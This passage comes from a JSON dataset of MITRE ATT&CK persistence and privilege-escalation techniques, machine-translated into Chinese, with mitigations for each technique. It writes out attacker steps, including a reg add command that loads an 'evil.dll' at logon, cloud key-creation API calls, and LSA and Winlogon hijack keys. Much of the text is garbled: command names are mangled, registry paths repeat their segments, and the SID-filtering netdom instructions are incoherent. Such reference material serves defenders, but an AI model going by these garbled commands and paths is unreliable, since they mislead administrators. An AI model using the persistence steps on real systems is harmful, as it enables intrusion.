          "content": "对手可以使用SID历史注射来升级特权和绕过访问控件。Windows安全标识符（SID）是标识用户或组帐户的唯一值。Windows Security在安全描述符和访问令牌中使用了SIDS。一个帐户可以在SID历史的Active Directory属性中保存其他SID，从而允许在域之间进行可互操作的帐户迁移（例如，SID历史中的所有值都包含在访问令牌中）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "借助域管理员（或同等）权利，可以将收获或众所周知的SID值插入SID历史，以使任意用户/组（例如企业管理员）模仿。这种操作可能会导致对本地资源的访问和/或通过横向移动技术（例如远程服务，SMB/Windows管理员共享或Windows Remote Management）访问其他不可访问的域。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "合法帐户迁移完成后，清理SID历史属性。"
            }
          ],
          [
            {
              "type": "text",
              "content": "考虑将SID过滤应用于森林信托和外部信托等令人震惊的信托，以将SID历史排除在访问域资源的请求之外。SID过滤可确保对信托的任何身份验证请求仅包含来自受信任域的安全主体SID（即防止受信任的域声称用户具有域以外的组成员资格）。"
            }
          ],
          [
            {
              "type": "text",
              "content": "默认情况下启用了森林信托的SID过滤，但在某些情况下可能已被禁用，以使儿童领域能够提供访问森林信托。SID对外部信任的过滤将在所有创建的外部信任使用服务器2003或更高版本的域控制器上自动启用。但是，请注意，SID过滤不会自动应用于旧信托基金，或者可能已故意禁用以允许对资源的范围访问。"
            }
          ],
          [
            {
              "type": "text",
              "content": "SID过滤可以通过："
            }
          ],
          [
            {
              "type": "text",
              "content": "使用Net tombor工具（NetDom Trust /domain： /ensebalsidhistory：no域控制器上的NO）将SID滤清器隔离到外部信托（NetDom Trust /domain net tomain /partinains：net tomain：yes on the域控制器），将SID滤清器隔离到外部信托，将SID滤清器隔离到外部信托：nobersIdhistory：nomable history：yes the域控制器），将森林信托上的介绍性禁用于森林信托。不建议将SID过滤应用于单个森林中的域信任，因为它是一种不受支持的配置，可能会导致破裂的变化。如果森林中的一个领域是不信任的，那么它不应是森林的成员。在这种情况下"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.001",
    "name": "Additional Cloud Credentials",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会将对手控制的凭据添加到云帐户中，以维持对受害者帐户和环境中实例的持续访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，除了Azure AD中的现有合法证书外，对手还可以为服务原理和应用程序添加凭据。这些凭据包括X509密钥和密码。有了足够的权限，有多种方法可以添加凭据，包括Azure Portal，Azure命令行接口和Azure或Az PowerShell模块。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在基础架构-AS-A-Service（IAAS）环境中，在通过云帐户获得访问权限后，对手可以使用"
        },
        {
          "type": "code",
          "content": " create> create> create> createkeypair "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " import> import> import> import> api生成或导入自己的SSH键。在AWS或 GCLOUD计算OS-LOGIN SSH-KEYS中添加"
        },
        {
          "type": "text",
          "content": "命令在GCP中。这允许在云环境中持续访问实例，而无需进一步使用受损的云帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以在AWS中使用"
        },
        {
          "type": "code",
          "content": " createAccesskey "
        },
        {
          "type": "text",
          "content": " api，或者"
        },
        {
          "type": "code",
          "content": " gcloud IAM service-accounts键keys create "
        },
        {
          "type": "text",
          "content": " gcp中的命令将访问键添加到帐户中。如果目标帐户与请求帐户具有不同的权限，则对手也可以在环境中升级其特权（即云帐户）。例如，在Azure AD环境中，具有应用程序管理员角色的对手可以为其应用程序的服务主体添加一组新的凭据。为此，对手将能够访问服务主体的角色和权限，这可能与应用程序管理员的角色和权限不同。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在AWS环境中，具有适当权限的对手也可以使用"
        },
        {
          "type": "code",
          "content": " sts：getFederationToken "
        },
        {
          "type": "text",
          "content": " api调用来创建与原始用户帐户权限有关的临时凭据集。即使原始帐户的API凭据被停用，这些凭证在其一生的持续时间内也可能仍然有效。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。考虑通过IAM策略执行"
            },
            {
              "type": "code",
              "content": " createKeypair "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " import> API调用的 createKeypair "
            },
            {
              "type": "text",
              "content": "的多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "配置访问控件和防火墙，以限制对关键系统和域控制器的访问。大多数云环境都支持单独的虚拟私有云（VPC）实例，以进一步分割云系统。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿将域管理员或根帐户用于日常操作，这些操作可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保低调的用户帐户无权将访问密钥添加到帐户中。在AWS环境中，除非明确要求，否则禁止用户调用"
            },
            {
              "type": "code",
              "content": " sts：getFederationToken "
            },
            {
              "type": "text",
              "content": " api。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.002",
    "name": "Additional Email Delegate Permissions",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以授予额外的许可级别，以维持对对手控制的电子邮件帐户的持续访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，"
        },
        {
          "type": "code",
          "content": " add-mailboxpermission "
        },
        {
          "type": "text",
          "content": " powershell cmdlet，可在本地交易所和基于云的服务Office 365中获得，将权限添加到邮箱中。在Google Workspace中，可以通过Google Admin控制台启用委托，用户可以通过其Gmail设置委派帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以通过单个文件夹权限或角色分配邮箱文件夹权限。在Office 365环境中，对手可以将默认或匿名用户权限或角色分配给信息商店顶部（root），收件箱或其他邮箱文件夹。通过将一个或两个用户权限分配给文件夹，对手可以利用租户中的任何其他帐户来维持目标用户邮件文件夹的持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这可以用于持续的威胁事件以及BEC（业务电子邮件妥协）事件中，对手可以在他们希望妥协的帐户中添加其他云角色。这可能会进一步实现其他技术来获得系统的访问。例如，妥协的业务帐户通常用于在创建收件箱规则（例如：内部矛盾）的同时，将消息发送到目标业务网络中的其他帐户，因此消息逃避垃圾邮件/网络钓鱼检测机制。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不需要电子邮件委托，请禁用它。在Google Workspace中，这可以通过Google Admin Console来完成。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿将域管理员帐户用于日常操作，这可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.003",
    "name": "Additional Cloud Roles",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在对手控制的云帐户中添加其他角色或权限，以维持对租户的持续访问。例如，对手可能会在基于云的环境中更新IAM策略，或在Office 365环境中添加新的全局管理员。有了足够的权限，折衷的帐户几乎可以无限制地访问数据和设置（包括重置其他管理员的密码的能力）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此帐户修改可能会立即遵循创建帐户或其他恶意帐户活动。对手还可以修改其妥协的现有有效帐户。这可能会导致特权升级，特别是如果添加的角色允许向其他帐户进行横向移动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在AWS环境中，具有适当权限的对手可以使用"
        },
        {
          "type": "code",
          "content": " createPolicyVersion "
        },
        {
          "type": "text",
          "content": " api来定义IAM策略的新版本或"
        },
        {
          "type": "code",
          "content": " eatheruserpolicy "
        },
        {
          "type": "text",
          "content": " apiIAM策略，具有折衷的用户帐户的其他权限或不同的权限。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保所有帐户都使用他们需要的最低特权。在Azure AD环境中，请考虑使用特权身份管理（PIM）来定义在分配给用户之前需要两个或更多批准的角色。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保低调的用户帐户没有权限可以在帐户中添加权限或更新IAM策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.004",
    "name": "SSH Authorized Keys",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改SSH "
        },
        {
          "type": "code",
          "content": "授权"
        },
        {
          "type": "text",
          "content": "文件以保持受害者主机上的持久性。Linux发行版和MACO通常使用基于密钥的身份验证来确保远程管理的SSH会话的身份验证过程。SSH中的"
        },
        {
          "type": "code",
          "content": "授权"
        },
        {
          "type": "text",
          "content": "文件指定可用于登录文件的用户帐户的SSH键。该文件通常在用户的主目录中找到，"
        },
        {
          "type": "code",
          "content": " <用户 - 家庭>/。ssh/euthoritied_keys "
        },
        {
          "type": "text",
          "content": "。用户可以编辑系统的SSH配置文件，以将指令PubKeyAuthentication和RSAAuthentication修改为“是”的值，以确保启用公共密钥和RSA身份验证。SSH配置文件通常位于"
        },
        {
          "type": "code",
          "content": "/etc/ssss/sshd_config "
        },
        {
          "type": "text",
          "content": "下。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以直接使用脚本或shell命令来修改ssh "
        },
        {
          "type": "code",
          "content": "授权> "
        },
        {
          "type": "text",
          "content": "文件，以添加自己的对手支持的公共密钥。在云环境中，对手可能能够通过命令行接口或REST API修改特定虚拟机的SSH授权_Keys文件。例如，通过使用Google Cloud CLI的“ Add-Metadata”命令，对手可能会将SSH键添加到用户帐户中。同样，在Azure中，对手可以通过补丁请求对API更新虚拟机的授权_keys文件。这样可以确保拥有相应的私钥的对手可以通过SSH作为现有用户登录。它也可能导致特权升级，即虚拟机或实例具有与请求用户不同的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果通过云API或命令行接口修改了授权_keys文件，则如果对较高私密的用户添加键，则对手可能会在目标虚拟机上实现特权升级。"
        }
      ],
      [
        {
          "type": "text",
          "content": "SSH键也可以添加到网络设备上的帐户中，例如使用"
        },
        {
          "type": "code",
          "content": " IP SSH PubKey-Chain "
        },
        {
          "type": "text",
          "content": "网络设备CLI命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用SSH，如果在主机上不需要使用"
            },
            {
              "type": "code",
              "content": "/etc/etcs/ssh/sshd_config "
            },
            {
              "type": "text",
              "content": "限制特定用户/组的SSH访问。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制访问"
            },
            {
              "type": "code",
              "content": "授权> keys "
            },
            {
              "type": "text",
              "content": "文件。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "在云环境中，确保只有明确要求权限更新实例元数据或配置的用户才能做到这一点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.005",
    "name": "Device Registration",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将设备注册到对手控制的帐户中。设备可以在多因素身份验证（MFA）系统中注册，该系统处理网络的身份验证，也可以在设备管理系统（处理设备访问和合规性）中注册。"
        }
      ],
      [
        {
          "type": "text",
          "content": "MFA系统（例如Duo或Okta）允许用户将设备与其帐户相关联，以完成MFA要求。损害用户凭据的对手可以注册新设备，以绕过初始的MFA要求并获得对网络的持续访问。在某些情况下，MFA自我注册过程可能仅需要一个用户名和密码来注册该帐户的第一个设备或将设备注册到非活动帐户中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "同样，现有访问网络的对手可以将设备注册到Azure AD和/或其设备管理系统Microsoft Intune，以便访问敏感数据或资源，同时绕过条件访问策略。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Azure AD中注册的设备可能能够通过组织内的电子邮件进行内部矛盾的活动，这些电子邮件不太可能被电子邮件客户端视为可疑。此外，对手可能能够通过注册大量设备来对Azure AD租户进行服务耗尽洪水。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "需要多因素身份验证才能在Azure AD中注册设备。配置多因素身份验证系统，以不允许注册非活动帐户的新设备。首次注册MFA时，请使用条件访问策略将设备注册限制为受信任的位置或设备，并考虑使用临时访问通行证作为初始MFA解决方案来注册设备。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.006",
    "name": "Additional Container Cluster Roles",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以向对手控制的用户或服务帐户添加其他角色或权限，以维持对容器编排系统的持续访问。例如，具有足够权限的对手可能会创建角色饰面或聚合气结，以将角色或聚类的簇绑定到Kubernetes帐户。在使用基于属性的访问控制（ABAC）的情况下，具有足够权限的对手可能会修改Kubernetes ABAC策略，以赋予目标帐户额外的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此帐户修改可能会立即遵循创建帐户或其他恶意帐户活动。对手还可以修改其妥协的现有有效帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "请注意，在云环境中部署集装箱编排系统的地方，就像Google Kubernetes引擎，Amazon Elastic Kubernetes服务和Azure Kubernetes服务一样，基于云的基于云的基于角色的访问控制（RBAC）作业或ABAC策略通常可以代替或除本地许可分配外。在这些情况下，该技术可以与其他云角色结合使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "需要通过云部署或通过诸如LDAP或SAML等身份验证协议集成到容器集群中的用户帐户多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保低调帐户没有权限可以在帐户中添加权限或更新容器集群角色。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.001",
    "name": "Registry Run Keys / Startup Folder",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过在启动文件夹中添加程序或使用注册表运行键来实现持久性。在注册表或“启动文件夹”中的“运行密钥”中添加条目将导致用户登录时所引用的程序执行。这些程序将在用户的上下文中执行，并具有帐户的关联权限级别。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认在Windows系统上创建以下运行键："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_current_user \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Run"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ Runonce"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Run"
        },
        {
          "type": "list",
          "content": "hkey_local_machine \\ software \\ Microsoft \\ Windows \\ Currentversion \\ Runonce"
        }
      ],
      [
        {
          "type": "text",
          "content": "运行键可能存在于多个蜂箱下。"
        },
        {
          "type": "code",
          "content": " HKEY_LOCAL_MACHINE \\ SOFTWORT \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Runonceex "
        },
        {
          "type": "text",
          "content": "也可用，但默认情况下未在Windows Vista上创建。注册表运行密钥条目可以直接引用程序或将其列为依赖项。例如，可以使用runonceex使用“依赖”键在登录处加载dll："
        },
        {
          "type": "code",
          "content": " reg添加hklm \\ software \\ microsoft \\ microsoft \\ windows \\ currentversion \\ runonceex \\ 0001 \\ 0001 \\ dived /v 1 /v 1 /d“ c：\\ \\ \\ \\临时\\邪恶[。] dll“ "
        },
        {
          "type": "text",
          "content": ""
        }
      ],
      [
        {
          "type": "text",
          "content": "将程序放置在启动文件夹中还将导致该程序在用户登录时执行。单个用户帐户以及系统范围的启动文件夹都有一个启动文件夹位置，无论哪个用户帐户在哪个中登录，都将被检查。。当前用户的启动文件夹路径是"
        },
        {
          "type": "code",
          "content": " c：\\ users \\ [username] \\ appdata \\ roaming \\ Microsoft \\ Microsoft \\ Windows \\ Windows \\ start菜单\\ start菜单\\ program \\ program \\ startup </code "
        },
        {
          "type": "text",
          "content": "。所有用户的启动文件夹路径均为"
        },
        {
          "type": "code",
          "content": " c：\\ programData \\ Microsoft \\ Windows \\ Windows \\ Start Menu \\ Program \\ Program \\ Program \\ startup "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下注册表密钥可用于设置启动文件夹项目以持续："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_current_user \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Explorer \\ User Shell文件夹"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ currentversion \\ explorer \\ shell文件夹"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Explorer \\ Shell文件夹"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Explorer \\ User Shell文件夹"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下注册表密钥可以在引导过程中控制自动启动服务："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_local_machine \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ RunservicesOnce"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ RunservicesOnce"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ RunServices"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ RunServices"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用策略设置指定启动程序在两个注册表中的任何一个中创建相应的值："
        }
      ],
      [
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Policies \\ Explorer \\ Run"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ Explorer \\ Run"
        }
      ],
      [
        {
          "type": "text",
          "content": "注册表密钥<Code> HKEY_CURRENT_USER \\ SOFTWORN \\ MICROSOFT \\ WINDOWS NT \\ CurrentVersion \\ Windows \\ Windows </code </code </code </code </code </code </code </code>自动为当前记录的用户运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认情况下，多施加"
        },
        {
          "type": "code",
          "content": " bootexecute "
        },
        {
          "type": "text",
          "content": "注册表密钥的值"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentcontrolset \\ control \\ control \\ control \\ session </code </code "
        },
        {
          "type": "text",
          "content": "设置为"
        },
        {
          "type": "code",
          "content": " autocheck autocheck autochk *"
        },
        {
          "type": "text",
          "content": "。该值会导致Windows在启动时检查硬盘的文件系统完整性，如果系统被异常关闭。对手可以将其他程序或进程添加到此注册表值中，这些程序将在启动时自动启动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这些配置位置来执行恶意软件，例如远程访问工具，以通过系统重新启动来保持持久性。对手也可以使用伪装来使注册表的条目看起来好像与合法计划相关联。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1547.002",
    "name": "Authentication Package",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "在系统启动时，对手可能会滥用身份验证软件包以执行DLL。Windows身份验证软件包DLL在系统启动时由本地安全管理局（LSA）加载。它们为操作系统提供了多个登录过程和多个安全协议的支持。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用LSA身份验证软件包提供的AutoStart机制来持久，通过在Windows注册表位置中放置对二进制的引用"
        },
        {
          "type": "code",
          "content": " HKLM \\ System \\ CurrentControlset \\ CurrentControlset \\ control \\ lsa \\ "
        },
        {
          "type": "text",
          "content": "，并使用"
        },
        {
          "type": "code",
          "content": "的密钥值> >“身份验证软件包” = <目标二进制> "
        },
        {
          "type": "text",
          "content": "。然后，当加载身份验证软件包时，系统将执行二进制文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "Windows 8.1，Windows Server 2012 R2和更高版本，可以通过设置注册表密钥"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ control \\ lsa \\ lsa \\ runasppl "
            },
            {
              "type": "text",
              "content": "来使LSA运行为受保护的过程灯（PPL），这需要LSA加载的所有DLL将由Microsoft签名。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.003",
    "name": "Time Providers",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用时间提供商在系统启动时执行DLL。Windows Time Service（W32Time）可以在域内和内部进行时间同步。W32Time时间提供商负责从硬件/网络资源中检索时间戳记，并将这些值输出到其他网络客户端。"
        }
      ],
      [
        {
          "type": "text",
          "content": "时间提供商被实现为动态链接库（DLL），该库在"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ w32Time \\ timeProviders \\ "
        },
        {
          "type": "text",
          "content": "的子键中注册。由服务控制管理器执导的时间提供商管理器加载并启动在系统启动和/或更改参数时在此密钥下列出和启用的时间提供商。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用这种体系结构来建立持久性，特别是通过注册和使恶意DLL作为时间提供商。时间提供商注册需要管理员特权，尽管执行将在本地服务帐户的上下文中运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑使用组策略对W32Time DLL进行配置和块添加/修改。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑使用组策略来配置并将修改为注册表中的W32Time参数。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.004",
    "name": "Winlogon Helper DLL",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "当用户登录时，对手可能会滥用Winlogon的功能执行DLL和/或可执行文件。Winlogon.exe是负责登录/logoff的操作的Windows组件，以及由CTRL-ALT-ALT-DELETE触发的安全注意序列（SAS）。"
        },
        {
          "type": "code",
          "content": " hklm \\ Software [\\ WOW6432Node \\] \\ Microsoft \\ Windows \\ Windows NT \\ CurrentVersion \\ Winlogon \\ "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " HKCU \\ software \\ Microsoft \\ Microsoft \\ Microsoft \\ Microsoft \\ windows nt nt \\ currentversion \\ currentversion \\ winlogon \\ winlogon \\ "
        },
        {
          "type": "text",
          "content": "用于管理支持Winlogon的其他帮助程序和功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对这些注册表密钥的恶意修改可能会导致Winlogon加载和执行恶意DLL和/或可执行文件。具体而言，已知以下亚基很容易受到虐待："
        }
      ],
      [
        {
          "type": "list",
          "content": "winlogon \\ Notify-指向处理Winlogon事件的通知软件包DLL"
        },
        {
          "type": "list",
          "content": "winlogon \\ userInit-指向用户登录时执行的用户初始化程序的用户初始化程序"
        },
        {
          "type": "list",
          "content": "winlogon \\ shell-指向Explorer.exe，用户登录时执行的系统外壳"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用这些功能反复执行恶意代码并建立持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过使用能够审核和/或阻止未知DLL的应用程序控制工具（例如Applocker），识别并阻止通过Winlogon Helper进程执行的潜在恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，以便只有授权的管理员才能执行Winlogon助手更改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.005",
    "name": "Security Support Provider",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用安全支持提供商（SSP）在系统启动时执行DLL。Windows SSP DLL被加载到系统启动时的本地安全管理局（LSA）过程中。加载到LSA中后，SSP DLL可以访问存储在Windows中的加密和明文密码，例如任何已记录的用户域密码或智能卡引脚。"
        }
      ],
      [
        {
          "type": "text",
          "content": "The SSP configuration is stored in two Registry keys: "
        },
        {
          "type": "code",
          "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages"
        },
        {
          "type": "text",
          "content": " and "
        },
        {
          "type": "code",
          "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"
        },
        {
          "type": "text",
          "content": "。对手可以修改这些注册表键以添加新的SSP，该键将在下次系统启动时或添加SecurityPackage Windows Windows API函数时加载。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "Windows 8.1，Windows Server 2012 R2和后来的版本可以通过设置注册表密钥"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ control \\ lsa \\ lsa \\ runasppl "
            },
            {
              "type": "text",
              "content": "来使LSA运行为受保护的过程灯（PPL），这需要所有SSP DLL将由Microsoft签名。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.006",
    "name": "Kernel Modules and Extensions",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改内核以自动在系统启动上执行程序。可加载的内核模块（LKMS）是可以按需加载并将其卸载到内核中的代码。它们扩展了内核的功能，而无需重新启动系统。例如，一种类型的模块是设备驱动程序，它允许内核访问连接到系统的硬件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当恶意使用时，LKM可以是具有最高操作系统特权（环0）运行的内核模式rootkit。基于LKM的rootkit的常见功能包括：隐藏自身，文件，过程和网络活动的选择性隐藏，以及篡改日志，提供身份验证的后门，并启用对非私人用户的root访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "内核扩展（也称为kext）在macOS中使用，将功能加载到类似于Linux的LKMS的系统上。由于内核负责执行安全性，并且内核扩展是按照内核而运行的，因此Kexts不受MACOS安全策略的管辖。通过"
        },
        {
          "type": "code",
          "content": " kextload "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " kextunload "
        },
        {
          "type": "text",
